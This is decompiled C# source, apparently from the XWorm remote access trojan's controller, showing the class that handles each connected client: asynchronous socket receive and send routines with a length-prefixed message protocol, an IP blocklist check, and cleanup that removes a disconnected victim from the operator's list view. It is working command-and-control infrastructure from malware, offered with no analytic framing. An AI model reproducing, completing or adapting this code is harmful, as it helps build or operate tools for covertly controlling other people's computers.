#define DEBUG
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

public class GClass5
{
	public delegate void _isDisconnected();

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_11_BeginReceive : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal IAsyncResult _0024VB_0024Local_ar;

		internal GClass5 _0024VB_0024Me;

		internal int _0024VB_0024ResumableLocal_Received_00240;

		internal GClass10 _0024VB_0024ResumableLocal_Read_00241;

		internal Exception _0024VB_0024ResumableLocal_ex_00242;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num > 2u && (!_0024VB_0024Me.bool_0 || !_0024VB_0024Me.CL.Connected))
				{
					_0024VB_0024Me.method_3();
				}
				else
				{
					checked
					{
						try
						{
							TaskAwaiter awaiter;
							TaskAwaiter awaiter2;
							switch (num)
							{
								default:
									_0024VB_0024ResumableLocal_Received_00240 = _0024VB_0024Me.CL.EndReceive(_0024VB_0024Local_ar);
									if (_0024VB_0024ResumableLocal_Received_00240 > 0)
									{
										if (_0024VB_0024Me.long_0 == -1L)
										{
											if (_0024VB_0024Me.bytes_0[0] == 0)
											{
												_0024VB_0024Me.long_0 = Conversions.ToLong(Module0.smethod_7(_0024VB_0024Me.memoryStream_0.ToArray()));
												_0024VB_0024Me.memoryStream_0.Dispose();
												_0024VB_0024Me.memoryStream_0 = new MemoryStream();
												if (_0024VB_0024Me.long_0 == 0L)
												{
													_0024VB_0024Me.long_0 = -1L;
													_0024VB_0024Me.CL.BeginReceive(_0024VB_0024Me.bytes_0, 0, _0024VB_0024Me.bytes_0.Length, SocketFlags.None, _0024VB_0024Me.method_0, _0024VB_0024Me.CL);
												}
												_0024VB_0024Me.bytes_0 = new byte[(int)(_0024VB_0024Me.long_0 - 1L) + 1];
												break;
											}
											awaiter2 = _0024VB_0024Me.memoryStream_0.WriteAsync(_0024VB_0024Me.bytes_0, 0, _0024VB_0024Me.bytes_0.Length).GetAwaiter();
											if (!awaiter2.IsCompleted)
											{
												num = 0;
												_0024State = 0;
												_0024A0 = awaiter2;
												ref AsyncVoidMethodBuilder reference = ref _0024Builder;
												VB_0024StateMachine_11_BeginReceive stateMachine = this;
												reference.AwaitUnsafeOnCompleted(ref awaiter2, ref stateMachine);
												return;
											}
											goto IL_0275;
										}
										awaiter = _0024VB_0024Me.memoryStream_0.WriteAsync(_0024VB_0024Me.bytes_0, 0, _0024VB_0024ResumableLocal_Received_00240).GetAwaiter();
										if (!awaiter.IsCompleted)
										{
											num = 2;
											_0024State = 2;
											_0024A0 = awaiter;
											ref AsyncVoidMethodBuilder reference2 = ref _0024Builder;
											VB_0024StateMachine_11_BeginReceive stateMachine = this;
											reference2.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
											return;
										}
										goto IL_02b3;
									}
									_0024VB_0024Me.method_3();
									goto end_IL_003d;
								case 0:
									num = -1;
									_0024State = -1;
									awaiter2 = _0024A0;
									_0024A0 = default(TaskAwaiter);
									goto IL_0275;
								case 1:
									num = -1;
									_0024State = -1;
									return;
								case 2:
									{
										num = -1;
										_0024State = -1;
										awaiter = _0024A0;
										_0024A0 = default(TaskAwaiter);
										goto IL_02b3;
									}
								IL_02b3:
									awaiter.GetResult();
									awaiter = default(TaskAwaiter);
									if (_0024VB_0024Me.memoryStream_0.Length == _0024VB_0024Me.long_0)
									{
										_0024VB_0024ResumableLocal_Read_00241 = new GClass10();
										GClass10.smethod_0(_0024VB_0024Me, _0024VB_0024Me.memoryStream_0.ToArray());
										GClass19.long_0 += _0024VB_0024Me.memoryStream_0.Length;
										_0024VB_0024Me.long_0 = -1L;
										_0024VB_0024Me.memoryStream_0.Dispose();
										_0024VB_0024Me.memoryStream_0 = new MemoryStream();
										_0024VB_0024Me.bytes_0 = new byte[1];
									}
									else
									{
										_0024VB_0024Me.bytes_0 = new byte[(int)(_0024VB_0024Me.long_0 - _0024VB_0024Me.memoryStream_0.Length - 1L) + 1];
									}
									break;
								IL_0275:
									awaiter2.GetResult();
									awaiter2 = default(TaskAwaiter);
									break;
							}
							_0024VB_0024Me.CL.BeginReceive(_0024VB_0024Me.bytes_0, 0, _0024VB_0024Me.bytes_0.Length, SocketFlags.None, _0024VB_0024Me.method_0, _0024VB_0024Me.CL);
						end_IL_003d:;
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							_0024VB_0024ResumableLocal_ex_00242 = ex2;
							Debug.WriteLine("BeginReceive " + _0024VB_0024ResumableLocal_ex_00242.Message);
							_0024VB_0024Me.method_3();
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_12_BeginSend : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal byte[] _0024VB_0024Local_Data;

		internal GClass5 _0024VB_0024Me;

		internal object _0024S0;

		internal bool _0024S1;

		internal MemoryStream memoryStream_0;

		internal byte[] _0024VB_0024ResumableLocal_b_00243;

		internal byte[] _0024VB_0024ResumableLocal_L_00244;

		internal Exception _0024VB_0024ResumableLocal_ex_00245;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			checked
			{
				try
				{
					_0024S0 = _0024VB_0024Me.object_0;
					ObjectFlowControl.CheckForSyncLockOnValueType(_0024S0);
					_0024S1 = false;
					try
					{
						Monitor.Enter(_0024S0, ref _0024S1);
						if (_0024VB_0024Me.bool_0 && _0024VB_0024Me.CL.Connected)
						{
							try
							{
								memoryStream_0 = new MemoryStream();
								try
								{
									_0024VB_0024ResumableLocal_b_00243 = Module0.smethod_12(_0024VB_0024Local_Data);
									_0024VB_0024ResumableLocal_L_00244 = Module0.smethod_6(Conversions.ToString(_0024VB_0024ResumableLocal_b_00243.Length) + "\0");
									memoryStream_0.Write(_0024VB_0024ResumableLocal_L_00244, 0, _0024VB_0024ResumableLocal_L_00244.Length);
									memoryStream_0.Write(_0024VB_0024ResumableLocal_b_00243, 0, _0024VB_0024ResumableLocal_b_00243.Length);
									_0024VB_0024Me.CL.Poll(-1, SelectMode.SelectWrite);
									_0024VB_0024Me.CL.BeginSend(memoryStream_0.ToArray(), 0, (int)memoryStream_0.Length, SocketFlags.None, _0024VB_0024Me.method_2, null);
									GClass19.long_1 += memoryStream_0.Length;
								}
								finally
								{
									if (num < 0 && memoryStream_0 != null)
									{
										((IDisposable)memoryStream_0).Dispose();
									}
								}
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								_0024VB_0024ResumableLocal_ex_00245 = ex2;
								Debug.WriteLine("BeginSend " + _0024VB_0024ResumableLocal_ex_00245.Message);
								_0024VB_0024Me.method_3();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							_0024VB_0024Me.method_3();
						}
					}
					finally
					{
						if (num < 0 && _0024S1)
						{
							Monitor.Exit(_0024S0);
						}
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception exception = ex3;
					_0024State = -2;
					_0024Builder.SetException(exception);
					ProjectData.ClearProjectError();
					return;
				}
				num = -2;
				_0024State = -2;
				_0024Builder.SetResult();
			}
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	public Socket CL;

	public bool bool_0;

	public long long_0;

	public bool bool_1;

	public byte[] bytes_0;

	public MemoryStream memoryStream_0;

	public string string_0;

	public ListViewItem listViewItem_0;

	public object object_0;

	public string string_1;

	public GClass5(Socket CL)
	{
		this.CL = null;
		bool_0 = false;
		long_0 = 0L;
		bool_1 = false;
		bytes_0 = null;
		memoryStream_0 = null;
		string_0 = null;
		listViewItem_0 = null;
		object_0 = null;
		string_1 = null;
		this.CL = CL;
		this.CL.ReceiveBufferSize = 51200;
		this.CL.SendBufferSize = 51200;
		bool_0 = true;
		long_0 = -1L;
		bytes_0 = new byte[1];
		memoryStream_0 = new MemoryStream();
		string_0 = CL.RemoteEndPoint.ToString();
		object_0 = RuntimeHelpers.GetObjectValue(new object());
		if (GClass19.strings_0.Contains(string_0.Split(':')[0]))
		{
			method_3();
		}
		else
		{
			this.CL.BeginReceive(bytes_0, 0, bytes_0.Length, SocketFlags.None, method_0, null);
		}
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_11_BeginReceive))]
	[DebuggerStepThrough]
	public void method_0(IAsyncResult ar)
	{
		VB_0024StateMachine_11_BeginReceive stateMachine = new VB_0024StateMachine_11_BeginReceive();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_ar = ar;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_12_BeginSend))]
	[DebuggerStepThrough]
	public void method_1(byte[] Data)
	{
		VB_0024StateMachine_12_BeginSend stateMachine = new VB_0024StateMachine_12_BeginSend();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_Data = Data;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	public void method_2(IAsyncResult ar)
	{
		try
		{
			CL.EndSend(ar);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debug.WriteLine("EndSend " + ex2.Message);
			method_3();
			ProjectData.ClearProjectError();
		}
	}

	public void method_3()
	{
		bool_0 = false;
		try
		{
			if (listViewItem_0 != null)
			{
				if (GClass10.main_0.Lv1.InvokeRequired)
				{
					GClass10.main_0.Lv1.BeginInvoke(new _isDisconnected(method_3));
					return;
				}
				listViewItem_0.Remove();
				GClass19.gclass5s_0.Remove(this);
				Module0.smethod_3(string_0.Split(':')[0] + " Disconnected", Color.Red);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debug.WriteLine("L.Remove " + ex2.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			CL.Close();
			CL.Dispose();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			Debug.WriteLine("C.Close " + ex4.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			memoryStream_0.Dispose();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			Debug.WriteLine("MS.Dispose " + ex6.Message);
			ProjectData.ClearProjectError();
		}
	}
}